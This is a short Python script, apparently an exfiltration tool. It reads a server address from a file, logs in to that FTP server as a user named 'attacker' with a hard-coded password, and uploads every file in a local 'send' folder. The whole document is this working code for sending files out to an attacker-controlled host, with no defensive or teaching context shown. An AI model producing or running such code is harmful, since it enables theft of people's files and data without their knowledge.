from ftplib import FTP
import glob
with open("server", "r") as f:
    server = FTP(f.read(),'attacker','attackerpass1234')
for file in glob.glob('send/*.*'):
    print(file)
    server.storbinary('STOR {}'.format(file.split("\\")[-1]), open(file, 'rb'))